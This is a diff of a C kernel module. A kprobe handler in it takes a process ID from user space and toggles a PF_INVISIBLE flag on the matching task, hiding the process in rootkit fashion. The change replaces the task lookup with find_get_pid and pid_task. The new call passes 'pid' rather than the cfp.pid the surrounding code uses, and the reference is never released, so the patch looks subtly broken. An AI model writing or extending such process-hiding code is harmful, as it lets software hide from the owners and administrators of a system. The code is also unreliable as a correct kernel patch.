@@ -161,8 +161,14 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
             if (!copy_from_user(&cfp, *(const void **)(v4 + 16), sizeof(cfp))) {
 				wuwa_info("pid for hide %d", cfp.pid);
 				pid_hide = cfp.pid;
-				struct task_struct* task;
-				task = find_task_by_vpid(cfp.pid);			
+				struct pid * pid_struct;
+				struct task_struct *task;
+				pid_struct = find_get_pid(pid);
+				if (!pid_struct)
+					return 0;
+				task = pid_task(pid_struct, PIDTYPE_PID);
+				if (!task)
+					return 0;		
 				task->flags ^= PF_INVISIBLE;
 			}
 			/*
